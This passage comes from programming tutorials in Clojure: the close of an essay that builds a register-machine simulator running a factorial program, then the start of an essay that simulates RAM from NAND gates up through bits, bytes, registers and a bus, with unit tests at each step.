    (def assign-operation-exp (partial drop 2)) ; (assign foo (op *) ...) => ((op *) ...

    (defn exec-assign
      "Assign comes in two forms:

      (assign reg-name <primitive-op>)
      i.e (assign foo (const 1))

      (assign reg-name <operation> <args...>)
      i.e (assign foo (op *) (const 2) (reg foo))"
      [data ins]
      (let [reg-name (assign-reg-name ins)
            val (if (operation-exp? ins)
                    (parse-operation data (assign-operation-exp ins))
                    (parse-primitive data (assign-operator ins)))]
        (-> data
            (assoc-in [:registry-map reg-name] val)
            (update :idx inc))))

\[/code\]

And badabing badaboom, assign works as we expect:

\[code\]

    (select-keys (exec-assign ex-machine-state-v2 '(assign counter (const 0)))
                   [:registry-map :idx])
    ; => {:registry-map {n 10, res 1, counter 0}, :idx 1}
    (select-keys (exec-assign ex-machine-state-v2 '(assign counter (const 10)))
                   [:registry-map :idx])
    ; => {:registry-map {n 10, res 1, counter 10}, :idx 1}

\[/code\]

Note how `counter` changed, and `idx` moved up by 1

## 4: goto

Next up, let's make `goto` work:

`(goto <primitive-exp>)` should set the `idx` in our machine to the
resulting value of a primitive expression:

\[code\]

    (def goto-dest second) ; (goto (label done)) => (label done)

    (defn exec-goto [data ins]
      (assoc data :idx (parse-primitive data (goto-dest ins))))

\[/code\]

Easy peasy:

\[code\]

    (select-keys (exec-goto ex-machine-state-v2 '(goto (label done)))
                   [:label->idx :idx])
    => {:label->idx {start 0, done 5}, :idx 5}

\[/code\]

`idx` was set to the value of `done`.

## 5: test-passed?

We are so close! Next up, let's consider the `test` and `branch`
instruction:

\[code\]

    (test (op >) (reg counter) (reg n))
    (branch (label done))

\[/code\]

Remember that when `test` runs, we need to figure out whether the `op`
returned a `yes` or `no`, and we move the machine forward. When `branch`
runs, we need to see if the last `test` instruction said yes. If it did,
we jump to the `branch destination`. Otherwise we no-op and move the
instruction list forward by one.

To implement this, we need to evolve our machine state one final time:

\[code\]

    (def ex-machine-state-v3
      {:registry-map {'n 10 'res 1 'counter 1}
       :label->idx {'start 0 'done 5}
       :op-map {'* * '+ + '> >}
       :idx 0
       :test-passed? false})

\[/code\]

`test-passed?` keeps track of the result of a `test` instruction.

## 6: test

With that, we can implement `test`:

\[code\]

    (def drop-tag rest) ; (test (op >) ...) => ((op >) ...)

    (defn exec-test [data ins]
      (-> data
          (assoc :test-passed? (parse-operation data (drop-tag ins)))
          (update :idx inc)))

\[/code\]

And bam:

\[code\]

    (:test-passed? (exec-test ex-machine-state-v3 '(test (op >) (reg counter) (reg n))))
    ; => false
    (:test-passed? (exec-test ex-machine-state-v3 '(test (op >) (reg n) (reg counter))))
    ; => true

\[/code\]

the machine's `test-passed?` state is is set to the value of the
operation.

## 7: branch

We can also implement `branch`:

\[code\]

    (def branch-dest second) ; (branch (label done)) => (label done)

    (defn exec-branch [data ins]
      (let [dest (parse-primitive data (branch-dest ins))]
        (if (:test-passed? data)
          (assoc data :idx dest)
          (update data :idx inc))))

\[/code\]

Let's try it out:

\[code\]

    (exec-branch
        {:label->idx {'done 5} :test-passed? false :idx 0}
        '(branch (label done)))
    ; => {:label->idx {done 5}, :test-passed? false, :idx 1}
    (exec-branch
        {:label->idx {'done 5} :test-passed? true :idx 0}
        '(branch (label done)))
    ; => {:label->idx {done 5}, :test-passed? true, :idx 5}

\[/code\]

When `test-passed?` was true, `idx` was set to the value of `done`

## 8: exec

We've now implemented all the instructions we need to make our factorial
machine work. Let's create a function that puts them all together:

\[code\]

    (defn exec-ins [data ins]
      (let [type->f {'assign exec-assign
                     'test exec-test
                     'branch exec-branch
                     'goto exec-goto}
            f (or (type->f (tag ins))
                  (throw (Exception. "Unexpected instruction")))]
        (f data ins)))

\[/code\]

Now, we can use this function to `route` to the right instruction:

\[code\]

    (:registry-map (exec-ins ex-machine-state-v3 '(assign counter (const 5))))
    ; => {n 10, res 1, counter 5}

\[/code\]

## 9: extract instructions

Oh boy, Okay, we are ready to go...almost!

Now, remember we started out with a language that looks like this:

\[code\]

    '(
       start

       (test (op >) (reg counter) (reg n))
       (branch (label done))

       (assign res (op *) (reg counter) (reg res))
       (assign counter (op +) (reg counter) (const 1))
       (goto (label start))

       done)

\[/code\]

But we require `label→idx` mapping. For these `indexes` to make sense,
we'll also want some representation of *just* the executable
instructions. Let's write those:

\[code\]

    (defn extract-instructions [raw-instructions]
      (vec (remove symbol? raw-instructions)))

    (defn extract-label->idx [raw-instructions]
      (second
        (reduce
          (fn [[idx label->idx] part]
            (if (symbol? part)
              [idx (assoc label->idx part idx)]
              [(inc idx) label->idx]))
          [0 {}]
          raw-instructions)))

\[/code\]

Here's what our factorial instructions would return:

\[code\]

    (extract-label->idx factorial-instructions)
    ; => {start 0, done 5}
    (extract-instructions factorial-instructions)
    ; =>
    [(test (op >) (reg counter) (reg n))
     (branch (label done))
     (assign res (op *) (reg counter) (reg res))
     (assign counter (op +) (reg counter) (const 1))
     (goto (label start))]

\[/code\]

Once we have these...we are ready to put it all together.

## 10: loop

Okay, `exec` can take a machine-state and an instruction, then return a
whole new machine state. `extract-label→idx` can create our `label→idx`
mapping, and `extract-instructions` can provide us with *just* the
executable expressions.

Let's put it all together:

\[code\]

    (defn run [registry-map op-map raw-instructions]
      (let [label->idx (extract-label->idx raw-instructions)
            instructions (extract-instructions raw-instructions)
            initial-machine-state {:registry-map registry-map
                                   :op-map op-map
                                   :idx 0
                                   :test-passed? nil
                                   :label->idx label->idx}]
        (loop [machine-state initial-machine-state]
          (if-let [ins (nth instructions (:idx machine-state) nil)]
            (recur (exec-ins machine-state ins))
            machine-state))))

\[/code\]

We take in a registry, an op-map, and some raw instructions. After that,
we run in a loop, executing the `instruction`, based on the `idx`, and
return when `idx` no longer returns an executable instruction.

Let's try it out!

\[code\]

    (get-in
      (run
        {'n 5 'counter 1 'res 1}
        {'* * '> > '+ +}
        factorial-instructions)
      [:registry-map 'res])
    ; => 120

\[/code\]

...You've just made your own machine simulator!

![](https://stopa.io/api/image/firstFrame/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1MjUyNjMwLTNhY2FhNDgwLTA3ZWItMTFlYi05MWE5LWMwMDZkZmVhYjZkYy5naWY)

## Fin

Wow, that was a journey. Hope you had fun! 🙂. If you'd like to see the
whole thing, take a look at the
[](https://github.com/stopachka/simple-%20simulator/blob/main/src/machine_simulator.clj)[github
repo](https://github.com/stopachka/simple-%20simulator/blob/main/src/machine_simulator.clj).

Up for a challenge? Try implementing a few other machines: fibonacci
sequences, exponentiation, etc. Try writing the recursive version of
these algorithms: to do that, you'll need a `stack` construct in our
machine-state, and a `(save <reg-name>)` `(restore <reg-name>)`
instruction. After that, heck you could implement a lisp evaluator!

If this kind of stuff interests you, reach out on twitter or email ---
am always happy to chat with like-minded hackers 🙂

------------------------------------------------------------------------

*Thanks to Joe Averbukh, David Magaltadze, Ian Sinnot, Raghavan
Lakshmana for reviewing drafts of this essay.*

\(1\) Computer registers also have an `enabler`, but I decided not to
include that in the essay. I didn't think it was necessary to grasp the
essence. I plan on writing another essay that would go lot deeper : )

\(2\) The maximum speed you could probably get on a ball is [\~200 km /
hour](https://www.youtube.com/watch?v=cSzwIBeihXA&ab_channel=masamiso),
while light travels 300 000 km... in one second. You can imagine how
this kind of speed can change the game: from making calculating machines
impractical to producing iphones.

# Simulating RAM in Clojure

"Computers are all made out of logic gates". We've heard that saying
before. We also have a sense that logic gates are very simple machines,
analogous to light switches even. This raises the question: *how exactly
do kind-of-light- switches come together to form computers*? How does
"storing a variable" or "calling a function" translate into logic gates
going on or off?

On a journey to answer that question, I discovered J Clark Scott's
excellent book ["How do It
Know?](https://www.amazon.com/But-How-Know-Principles-%20Computers-ebook/dp/B00F25LEVC)".
He starts with NAND gates and takes you on a journey to build a computer
using them.

I liked his book so much that I took his schematic for RAM, and
simulated it in Clojure. In this essay, I'll guide you through doing
just that: we'll simulate NAND gates, and use about *14 thousand* of
them to build 256 bytes of RAM.

Going through this simulation ingrained an "aha" feeling in me: watching
14 thousand little machines chug away makes you feel that whoever uses a
computer is a wizard. A wizard with an army of millions of machine
servants doing billions of little jobs for them every second. I hope it
gives you the same feeling. 🙂

## Pre-requisites

To grok this essay, you need to understand this picture:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NDk4LTdhY2RkMzgwLTBjOTItMTFlYi04NWQ2LTZmOWEzNGE2NmU5Zi5wbmc)

This describes a NAND gate. A NAND gate is a machine that has two input
wires. If both input wires have a "high" charge (represented as 1), the
output charge is "low" (represented as zero). With any other combination
of input charges, the output charge is high.

Notice that the wires carry a charge, but we choose to interpret
*meaning* in the charge. "high charge" means 1, and "low charge" means
0. Nothing changes in the machine, this is just something we decided as
humans (1).

On the left you see a circuit diagram. You can read it as input wires
`a` and `b` carrying charges into the `NAND` gate. The `NAND` gate has a
wire `c`, carrying the output charge. For all the circuit diagrams we'll
draw, you can read them as electricity "flowing" from left to right, or
top to bottom.

On the right is a "truth" table for a NAND gate. This is just a fancy
name for summarizing every state a `NAND` gate can be, based on the
input wires.

Now, we can start even lower than a `NAND gate`, but this machine is
simple enough. It can't be so hard to build something that turns off
when two inputs are turned on. You don't have to take my word for it
though, you can search up "building a NAND gate with transistors", and
come back when you're convinced.

Time to code! 🙂

## 0: State

First things first, we need some way to represent the state of our
circuit. We know that our RAM will be built completely from `NAND`
gates, so let's take inspiration from one:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTI0LTg0NTczYjgwLTBjOTItMTFlYi05NWMyLWJlMWQ4MzFlNTg5MC5wbmc)

If we look at this example we can see that:

1.  We have wires.
2.  Wires have charges.
3.  We hook wires together with NAND Gates

Here's one way we can map that to a data structure in Clojure:

\[code\]

    (def ex-state-v0 {:charge-map {:a 1 :b 1 :c 0}
                      :nand-gates [{:ins [:a :b]
                                    :out :c}]})

\[/code\]

We can use keywords to represent our wires. We can also keep a map that
tells us the charges of our wires. Finally, we can keep a list of NAND
gates, which tell us how these wires connect.

Fine enough way to represent our circuit for now! Let's create a few
functions that can help us manage this representation:

\[code\]

    ; update state v0
    ; ---------------

    (def empty-state {:charge-map {} :nand-gates []})

    (defn charge [state wire]
      (get-in state [:charge-map wire]))

    (defn charges [state wires]
      (map (partial charge state) wires))

    (defn set-charge [state wire charge]
      (assoc-in state [:charge-map wire] charge))

    (defn wire-nand-gate [state a b o]
      (update state :nand-gates conj {:ins [a b] :out o}))

\[/code\]

These are all the basic tools we need to "connect" a NAND gate into our
circuit. Let's try them out in the REPL:

\[code\]

    (charges (-> empty-state
                   (set-charge :a 1)
                   (set-charge :b 0))
               [:a :b])
    ; => (1 0)
    (wire-nand-gate empty-state :a :b :c)
    ; => {:charge-map {}, :nand-gates [{:ins [:a :b], :out :c}]}

\[/code\]

Nice! We can now "wire" up a circuit. Let's run some electricity through
it.

## 1: Trigger

To figure out how to simulate electricity into our circuit, let's
remember our diagram again:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTU3LTk0NmYxYjAwLTBjOTItMTFlYi05NGZkLTNlM2JkMzI5OWYwNC5wbmc)

One way we can model this is to imagine that electricity is like water:
It "flows" from sources into wires, and "triggers" all the devices that
are connected to those wires.

With a model like that, here's what would happen if a charge was
"triggered" on `a`:

1.  First, `a`'s charge would update.
2.  After that `a` 's charge would transfer to all the NAND gates that
    are connected to it. In this case, it would be our one NAND gate
    above.
3.  Each NAND gate would then recompute its charge, and if it changed,
    trigger its output wire in turn. In our case that's `c`
4.  If `c` was connected to other `NAND` gates, those gates would
    trigger, and the process would continue.

Now, this is a very naive view of how electricity works (2), but it's
good enough for us to model RAM!

Let's translate this into code.

To do that, we need a way to model what a `NAND` gate does:

\[code\]

    (defn nand-output [a b]
      (if (= a b 1) 0 1))

\[/code\]

\[code\]

    (nand-output 0 0)
    ; => 1
    (nand-output 1 1)
    ; => 0

\[/code\]

Our `nand-output` function takes two input charges, and produces the
output charge that a `NAND` gate would produce.

Next, we need a function to find all the `NAND` gates that are connected
to a specific wire:

\[code\]

    (defn dependent-nand-gates [state wire]
      (filter 
        (fn [{:keys [ins]}] (some #{wire} ins)) 
        (:nand-gates state)))

\[/code\]

\[code\]

    (dependent-nand-gates (wire-nand-gate empty-state :a :b :c) :a)
    ; => ({:ins [:a :b], :out :c})

\[/code\]

This searches all of our `NAND` gates in our circuit, and finds the ones
which are connected to a specific wire.

With that, we have what we need to implement `trigger`:

\[code\]

    (declare trigger-nand-gate)
    (defn trigger
      ([state wire new-v]
       (let [old-charge (charge state wire)
             state' (set-charge state wire new-v)
             new-charge (charge state' wire)]
         (if (= old-charge new-charge)
           state'
           (reduce (fn [acc-state out] (trigger-nand-gate acc-state out))
                   state'
                   (dependent-nand-gates state' wire))))))

\[/code\]

This follows exactly the model we described:

1.  Update the charge of the wire that was triggered
2.  Find all the `NAND` gates that the wire was connected too
3.  Trigger those `NAND` gates if needed.

What's left is to implement what a `NAND` gate does when it is
triggered:

\[code\]

    (defn trigger-nand-gate
      [state {:keys [ins out]}]
      (let [new-charge (apply nand-output (charges state ins))]
        (trigger state out new-charge)))

\[/code\]

This calculates the new charge of a `NAND` gate, and triggers the
`output` wire with that charge.

Great, we have a way to simulate charges flowing through NAND gates!

One final helper function: let's create something that will will let us
"trigger" many wires:

\[code\]

    (defn trigger-many [state wires charges]
      (reduce
        (fn [acc-state [wire charge]]
          (trigger acc-state wire charge))
        state
        (map vector wires charges)))

\[/code\]

We'll want to do this so much that it's good to have around.

## 2: Simulate NAND

We have what we need to simulate a simple charge flowing through a NAND
gate. Let's write a test for that:

\[code\]

    (deftest test-nand-gate
      (let [s1 (-> empty-state
                   (wire-nand-gate :a :b :o)
                   (trigger-many [:a :b] [1 0]))
            s2 (-> s1
                   (trigger :b 1))]
        (testing "just a is on"
          (is (= '(1 0 1) (charges s1 [:a :b :o]))))
        (testing "both a and b are on"
          (is (= '(1 1 0) (charges s2 [:a :b :o]))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 2 assertions.
    ; No failures.

\[/code\]

Works like a charm!

## 3: Simulate NOT

What would happen, if we took a NAND gate, and fed the *same* wire in
both inputs?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTc3LTlkZjg4MzAwLTBjOTItMTFlYi04M2VmLTMwNDViYTQ1YWM5Mi5wbmc)

Well, the output would end up being the opposite of its input. When `a`
is zero, `c` is 1, when `a` is 1, `c` is 0. Boom, that happens to be a
`NOT` gate. Here's how that looks:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTk5LWEzZWU2NDAwLTBjOTItMTFlYi05YWFjLTYwM2E4MmQzNmVjNS5wbmc)

To implement our `NOT` gate, we can do exactly as our diagram described:
Feed the same wire to *both* inputs of a `NAND` gate:

\[code\]

    (defn wire-not-gate
      ([state a o]
       (wire-nand-gate state a a o)))

\[/code\]

🤯 1 line of code. If we test that out...

\[code\]

    (deftest test-not-gate
      (let [s1 (-> empty-state
                   (wire-not-gate :a :o)
                   (trigger :a 0))
            s2 (-> s1
                   (trigger :a 1))]
        (testing "a is off"
          (is (= '(0 1) (charges s1 [:a :o]))))
        (testing "a is on"
          (is (= '(1 0) (charges s2 [:a :o]))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 2 assertions.
    ; No failures

\[/code\]

It works! Onwards.

## 4: Simulate AND

What if we plugged the output of one `NAND` as the input of a `NOT`
gate?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjQwLWI1ZDAwNzAwLTBjOTItMTFlYi04MzBhLWVjMzc1Zjk5Y2E1ZC5wbmc)

Well, it would be opposite of a `NAND` gate: `d` would only be 1 when
*both* `a` and `b` are 1. That's the `AND` gate:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjU2LWJlMjg0MjAwLTBjOTItMTFlYi04N2Q2LTM0MTJhMDY4YWEyZS5wbmc)

To implement `AND`, we can follow just that schematic:

\[code\]

    (defn wire-and-gate [state a b o]
      (let [nand-o :c]
        (-> state
            (wire-nand-gate a b nand-o)
            (wire-not-gate nand-o o))))

\[/code\]

This would work...almost. The tricky thing here is that inside the
function we have an "intermediary" wire `c`, which connects the `NAND`
gate and `NOT` gate. If we made *two* `AND` gates for example, then they
would share the same wire `:c`!

To fix this, let's write some helper functions to create unique wires:

\[code\]

    (def _u (atom {}))
    (defn uniq-n [k]
      (swap! _u update k (fn [i] (inc (or i 0))))
      (get @_u k))

    (defn kw [& args]
      (->> args
           (map (fn [x] (if ((some-fn keyword? symbol?) x)
                          (name x)
                          x)))
           (apply str)
           keyword))

    (defn wire
      ([n]
       (let [i (uniq-n n)]
         (if (> i 1) (kw n "#" i) n))))

\[/code\]

Let's see how it looks:

\[code\]

    [(wire :a) (wire :a)]
    => [:a :a#2]

\[/code\]

Now if we create a wire with a name that already exists, it'll add a
nice little "#2" beside it.

Nice! Let's use it in `wire-and-gate`

\[code\]

    (defn wire-and-gate [state a b o]
      (let [nand-o (wire (kw a b :and-nand-o))]
        (-> state
            (wire-nand-gate a b nand-o)
            (wire-not-gate nand-o o))))

\[/code\]

If we test this out...

\[code\]

    (deftest test-and-gate
      (let [s1 (-> empty-state
                   (wire-and-gate :a :b :o)
                   (trigger-many [:a :b] [1 0]))
            s2 (-> s1
                   (trigger :b 1))]
        (testing "just a is on"
          (is (= '(1 0 0) (charges s1 [:a :b :o]))))
        (testing "a and b on"
          (is (= '(1 1 1) (charges s2 [:a :b :o]))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 2 assertions.
    ; No failures.

\[/code\]

Works like a charm!

## 5: Simulate Bits

Now comes one of the hardest and most important circuits we'll need to
understand. Let's start by describing our goal:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjgxLWNiNDUzMTAwLTBjOTItMTFlYi05ZjBjLTEzNmNjZTMwOTNiYy5wbmc)

Notice the interesting thing here. When the `s` wire is "1", the value
of `i` is transferred to `o`. When it is "0", the value of `o` is *no
longer affected* by i. `o`\'s charge is *whatever it was before.*

If we can make something like this, that would mean that the charge on
"o" is *stored.* **Since it can be either 1 or 0, we can in effect
"store" 1 bit of data.**

Here's how we can do this:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NjkyLWQxM2IxMjAwLTBjOTItMTFlYi05MzQxLTk0MmMyMzFhZGJjYy5wbmc)

The trick with this circuit is the way `o` and `c` are connected
together. This intertwining thing is called a "latch", because once a
charge gets set in a certain way, these gates will find an equilibrium
that causes `o` to be stored. Pretty cool!

This circuit is pretty complicated and a bit [hard to
understand](https://electronics.stackexchange.com/questions/524618/how-does-%20electricty-flow-in-a-flip-flop-circuit-i-cant-understand-how-%20memory-b?noredirect=1#comment1351903_524618)
(3), but we've got the power of simulation at our fingertips! Let's try
building it and test it out:

\[code\]

    (defn wire-memory-bit
      "To understand the variables in this circuit,
      follow along with the diagram in the tutorial"
      ([state s i o]
       (let [a (wire :a)
             b (wire :b)
             c (wire :c)]
         (-> state
             (wire-nand-gate i s a)
             (wire-nand-gate a s b)
             (wire-nand-gate a c o)
             (wire-nand-gate b o c)))))

\[/code\]

Looks so pretty for such a complicated machine. Now the ultimate
question...will it work?!

\[code\]

    (deftest test-memory-bit
      (let [s1 (-> empty-state
                   (wire-memory-bit :s :i :o)
                   (trigger-many [:i :s] [1 0]))
            s2 (-> s1
                   (trigger :s 1))
            s3 (-> s2
                   (trigger-many [:s :i] [0 0]))]
        (testing "turning i on does not affect the rest"
          (is (= '(0 1 0) (charges s1 [:s :i :o]))))
        (testing "enabling set transfers i to o"
          (is (= '(1 1 1)
                 (charges s2 [:s :i :o]))))
        (testing "disabling set, removes further effects on o"
          (is (= '(0 0 1)
                 (charges s3 [:s :i :o]))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 3 assertions.
    ; No failures.

\[/code\]

Oh ma gad...it works!

## 6: Simulate Bytes

Now that we have a bit, we can take one `s` wire and tie 8 memory bits
together with it. That would let us `set` 8 bits together, which means
we can "store" 8 bits of data...which gives us a byte! (5). Here's how
that would look:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NzA3LWQ5OTM0ZDAwLTBjOTItMTFlYi04ZjZkLTMyMGRkYTRhYzAzMy5wbmc)

Note that in our diagram now "two wires together" is short-hand for
writing `8` wires.

Let's write up a byte in our simulation:

\[code\]

    (defn wire-byte [state s ins outs]
      (reduce (fn [acc-state [i o]]
                (wire-memory-bit acc-state s i o))
              state
              (map vector ins outs)))

\[/code\]

Easy peasy!

To test this out though, we're going to need a way to "create" a bunch
of names for wires. Let's write a few helper functions that make this
easy:

\[code\]

    (defn names [n r]
      (mapv (fn [i] (kw n "-" i)) (range r)))

    (def wires (comp (partial mapv wire) names))

\[/code\]

Here's how we could make 8 wires with the name `:i`

\[code\]

    (wires :i 8)
    ; => [:i-0 :i-1 :i-2 :i-3 :i-4 :i-5 :i-6 :i-7]

\[/code\]

Nice! Now to write our test for the byte:

\[code\]

    (deftest test-byte
      (let [ii (wires :i 8)
            os (wires :o 8)
            s1 (-> empty-state
                   (wire-byte :s ii os)
                   (trigger-many ii [1 1 1 0 0 0 0 0])
                   (trigger :s 0))
            s2 (-> s1
                   (trigger :s 1))
            s3 (-> s2
                   (trigger :s 0)
                   (trigger-many ii [0 0 0 0 0 0 0 1]))]
        (testing "disabling set, removes further effects on o"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s1 ii)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s1 os))))
        (testing "set s, so os become 1 1 1"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 ii)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 os))))
        (testing "freeze by disabling s. see that further changes to i do nothing to o"
          (is (= '(0 0 0 0 0 0 0 1)
                 (charges s3 ii)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 os))))))

\[/code\]

Phoof...does it work?

\[code\]

    ; Ran 1 test containing 6 assertions.
    ; No failures.

\[/code\]

Yes!

## 7: Simulate Enabler

Now, imagine we had *two* bytes, connected like this:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NzIxLWUwYmE1YjAwLTBjOTItMTFlYi04NDNhLTdkZDRjMTlmMTY2Mi5wbmc)

Notice how the output wires are *shared* between `B1` and `B2`. If `B1`
had a charge of "11110000", and `B2` had a charge of "0001111", what
would happen to the output wires? It would carry a charge of "1111111"!
Say we wanted to make sure *only* one of the bytes sent their output
charge into `output wires`. How could we do that?

We'll need a new machine. Let's consider what would happen if we took a
bunch of `AND` gates, and connected them together like this:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NzQzLWU5YWIyYzgwLTBjOTItMTFlYi04YTI0LWJkN2Q2ODdlNjdjZS5wbmc)

Now, if the "e" wire is "on", the output wires are charged with whatever
the input wires are. Buut, if the "e" wire is "off", the output *zeroes
out.* This machine is called the "enabler". If we put this together
right, we could control what charge gets sent to `output wires`!

Let's set it up first, it should be easy peasy:

\[code\]

    (defn wire-enabler
      [state e ins outs]
      (reduce
        (fn [acc-state [in out]]
          (wire-and-gate acc-state e in out))
        state
        (map vector ins outs)))

\[/code\]

Looks nice! Let's see the test:

\[code\]

    (deftest test-enabler
      (let [ii (wires :i 8)
            os (wires :o 8)
            s1 (-> empty-state
                   (wire-enabler :e ii os)
                   (trigger-many ii [1 1 1 0 0 0 0 0])
                   (trigger :e 0))
            s2 (trigger s1 :e 1)
            s3 (trigger s2 :e 0)]
        (testing "is should be set, but os should be 0"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s1 ii)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s1 os))))
        (testing "os should pass if enabled"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 ii)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 os))))
        (testing "os should revert if disabled"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s3 ii)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s3 os))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 6 assertions.
    ; No failures.

\[/code\]

🔥

## 8: Simulate Register

Here's how we could "fix" our problem with `B1` and `B2`:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NzcwLWY3NjBiMjAwLTBjOTItMTFlYi05OTYzLTkzMDVmYmY1NzcyZS5wbmc)

If we stuck an "enabler" in front of each byte, we could control what
gets sent to `output wires`. If we wanted to have `B1`\'s charge, we
would "enable `E1`", and make sure `E2` was disabled, and vice versa.

This combination of byte and enabler is so common that we can build a
machine for that:

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2ODI1LTEwNjk2MzAwLTBjOTMtMTFlYi05NDZhLWM4M2Y3YzU0ODFmMS5wbmc)

It's called a register! Registers let us both control *what* bytes are
stored, and *when* these bytes are exposed as output.

To set this up, all we need to do is to tie together a byte and an
enabler:

\[code\]

    (defn wire-register [state s e ins bits outs]
      (-> state
          (wire-byte s ins bits)
          (wire-enabler e bits outs)))

\[/code\]

Badabing, badaboom, it should work. This is a pretty important machine,
so let's make darn sure it works:

\[code\]

    (deftest test-register
      (let [ii (wires :i 8)
            bs (wires :b 8)
            os (wires :o 8)
            s1 (-> empty-state
                   (wire-register :s :e ii bs os)
                   (trigger-many ii [1 1 1 0 0 0 0 0])
                   (trigger :s 0)
                   (trigger :e 0))
            s2 (trigger s1 :s 1)
            s3 (trigger s2 :e 1)
            s4 (-> s3
                   (trigger :s 0)
                   (trigger-many ii [0 0 0 0 0 0 0 1]))
            s5 (trigger s4 :e 0)]
        (testing "is should be set, but bs and os should be 0, b/c s & e are 0"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s1 ii)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s1 bs)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s1 os))))
        (testing "is & bs should be set, as s is on. but os should be 0, b/c e is off"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 ii)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s2 bs)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s2 os))))
        (testing "is & bs should be set, as s is on. but os should be 0, b/c e is off"
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s3 ii)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s3 bs)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s3 os))))
        (testing "is should be new v, but bs and os should be the old value"
          (is (= '(0 0 0 0 0 0 0 1)
                 (charges s4 ii)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s4 bs)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s4 os))))
        (testing "os should 0 out again"
          (is (= '(0 0 0 0 0 0 0 1)
                 (charges s5 ii)))
          (is (= '(1 1 1 0 0 0 0 0)
                 (charges s5 bs)))
          (is (= '(0 0 0 0 0 0 0 0)
                 (charges s5 os))))))

\[/code\]

\[code\]

    ; Ran 1 test containing 15 assertions.
    ; No failures.

\[/code\]

Very cool!

## 9: Simulate Bus

Okay, let's continue our experiment, to an astounding result: what if we
connected the inputs *and* outputs of a bunch of registers to the *same*
wires?

![image](https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2ODQ0LTE5ZjJjYjAwLTBjOTMtMTFlYi04NjliLTEwMWQwM2I3ODg4Zi5wbmc)

Now, remember that `s` allows us to decide what gets "stored" into a
register, and "e" lets us "pass" the charge of a register's byte
*through* to the output.

What would happen in the following scenario. Say R1's byte contains
"111", all `s` and `e` wires are 0.

1.  "Charge `R1`'s `e` to 1". 1. Now `R1` would enable, and the `bus`
    wires would carry the same charge as `R1`
2.  "Charge `R3`'s `s` to 1, then 0". 1. This would set the value of
    `R3`, to the current charge flowing in `bus`. *This happens to be
    the output of`R1`!*
3.  "Set `R1`\'s `e` to 0" Now the current in `bus` would disappear
    again

The result? **The byte in R1 would have been "copied" to R3.** We've
just created a `bus`.

To create a bus, all we need to do is to connect a register's input and
output to the same "bus" wires:

\[code\]

    (defn wire-bus [state bus-wires s e bits]
      (wire-register state s e bus-wires bits bus-wires))

\[/code\]

This is only a single line, but it's pretty important to get right. It's
what lets us "copy" registers after all. Let's see if it works:

\[code\]

    (deftest test-wire-bus
      (let [bw (wires :bw 8)
